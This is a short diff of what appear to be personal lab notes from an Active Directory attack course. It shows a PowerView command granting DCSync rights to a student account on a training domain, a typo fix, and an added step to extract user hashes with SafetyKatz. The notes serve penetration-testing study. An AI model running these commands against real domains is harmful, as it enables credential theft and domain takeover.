@@ -517,4 +517,6 @@ add the permission to student115
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 ![[Pasted image 20231025125006.png]]
-Let's check if now we have the permissions (use the previous commnd)
+Let's check if now we have the permissions (use the previous command)
+![[Pasted image 20231025125252.png]]
+Now use safetykatz to extract the hash of any user
